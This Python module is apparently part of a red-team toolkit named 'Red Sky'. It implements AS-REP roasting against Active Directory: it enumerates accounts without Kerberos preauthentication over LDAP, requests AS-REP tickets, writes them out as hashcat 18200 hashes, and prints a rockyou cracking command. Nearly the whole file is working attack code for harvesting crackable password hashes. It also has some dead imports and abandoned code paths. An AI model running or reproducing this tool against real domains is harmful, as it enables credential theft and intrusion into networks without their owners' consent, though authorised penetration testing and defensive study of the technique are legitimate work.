# language: Python, file: Program/creds/asrep.py, target: Red Sky creds — asrep roast
# Enumerate DONT_REQ_PREAUTH accounts, request AS-REP, extract crackable hashes
# in hashcat 18200 format. Uses impacket.

import json
import sys
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


def _ldap_enum_nopreauth(host: str, domain: str, user: str, passwd: str) -> List[Dict]:
    try:
        import ldap3
    except ImportError:
        print_err("ldap3 missing")
        return []

    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    results = []
    try:
        server = ldap3.Server(host, port=389, get_info=ldap3.NONE, connect_timeout=8)
        conn = ldap3.Connection(server,
                                user=f"{domain}\\{user}" if domain else user,
                                password=passwd,
                                authentication=ldap3.NTLM,
                                auto_bind=True, receive_timeout=8)
        conn.search(
            search_base=base_dn,
            search_filter="(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            attributes=["sAMAccountName", "userAccountControl"],
        )
        for e in conn.entries:
            results.append({
                "user": str(e.sAMAccountName.value),
                "uac": int(e.userAccountControl.value) if e.userAccountControl else 0,
            })
        conn.unbind()
    except Exception as e:
        print_err(f"LDAP query failed: {e}")
    return results


def _request_asrep(host: str, domain: str, target_user: str) -> Optional[str]:
    """Request AS-REP without preauth. Extract the hash for hashcat 18200."""
    try:
        from impacket.krb5.kerberosv5 import sendReceive
        from impacket.krb5.asn1 import AS_REQ, KRB_ERROR, AS_REP, seq_set, seq_set_iter
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        from impacket.krb5 import constants
    except ImportError:
        print_err("impacket.krb5 missing")
        return None

    try:
        # craft AS-REQ with no preauth
        user_principal = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        as_req = AS_REQ()
        server_name = Principal(f"krbtgt/{domain.upper()}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # build the request
        from impacket.krb5.asn1 import seq_set
        from pyasn1.codec.der import encoder

        # Use impacket's helper — this is the pattern from GetNPUsers.py
        from impacket.examples.GetNPUsers import GetNPUsers
        # We can't just call the class, so implement inline

        # Simpler: use the impacket kerberosv5 getKerberosTGT with empty password
        from impacket.krb5.kerberosv5 import getKerberosTGT
        try:
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                user_principal, "", domain, "", "", "", "", kdcHost=host
            )
        except Exception as e:
            # preauth required — that's expected if user has preauth
            msg = str(e)
            if "KDC_ERR_PREAUTH_REQUIRED" in msg:
                print_warn(f"{target_user}: preauth required (not vulnerable)")
                return None
            # if we got an AS-REP, the error will contain the enc-part
            raise

        # if we got here, the TGT is the AS-REP — extract the hash
        from impacket.krb5.asn1 import AS_REP
        from pyasn1.codec.der import decoder
        decoded = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        enc_part = decoded["enc-part"]
        cipher_type = str(enc_part["etype"])
        cipher_bytes = bytes(enc_part["cipher"])
        hexed = cipher_bytes.hex()

        # hashcat 18200 format
        line = f"$krb5asrep${cipher_type}${target_user}@{domain.upper()}:{hexed[:32]}${hexed[32:]}"
        return line
    except Exception as e:
        print_warn(f"AS-REP request failed for {target_user}: {e}")
        return None


def cmd_asrep(host: str, domain: str, user: str, passwd: str, out_file: str = "") -> int:
    print_info(f"asrep roasting {domain}")
    print_kv("dc", host)
    print_kv("auth", f"{domain}\\{user}")
    print()

    users = _ldap_enum_nopreauth(host, domain, user, passwd)
    if not users:
        print_warn("no DONT_REQ_PREAUTH accounts found")
        return 1

    print_ok(f"{len(users)} candidate(s)")
    for u in users:
        print(f"  {ARTERY}▓{RESET} {BONE}{u['user']}{RESET}  {ASH}uac=0x{u['uac']:08x}{RESET}")

    print()
    print_info("requesting AS-REP for each")
    hashes = []
    for u in users:
        line = _request_asrep(host, domain, u["user"])
        if line:
            hashes.append({"user": u["user"], "hash": line})
            print_ok(f"{u['user']:<24} {line[:80]}…")

    print()
    print_kv("hashes", len(hashes))

    if hashes:
        from pathlib import Path
        out = out_file or str(OUTPUT_DIR / f"asrep_{domain}.txt")
        Path(out).parent.mkdir(parents=True, exist_ok=True)
        with open(out, "w") as f:
            for h in hashes:
                f.write(h["hash"] + "\n")
        print_kv("saved", out)
        print()
        print_info("crack with hashcat mode 18200:")
        print(f"  {ASH}hashcat -m 18200 {out} /usr/share/wordlists/rockyou.txt{RESET}")
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky creds asrep", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--dc", required=False)
    p.add_argument("--domain", required=False)
    p.add_argument("--user", required=False)
    p.add_argument("--pass", dest="passwd", required=False)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky creds asrep --dc DC --domain DOM --user U --pass P")
        return 2

    if ns.help:
        print_info("redsky creds asrep --dc <dc> --domain <dom> --user <u> --pass <p> [--out file]")
        return 0

    if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
        print_err("--dc --domain --user --pass are required")
        return 2

    return cmd_asrep(ns.dc, ns.domain, ns.user, ns.passwd, ns.out)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
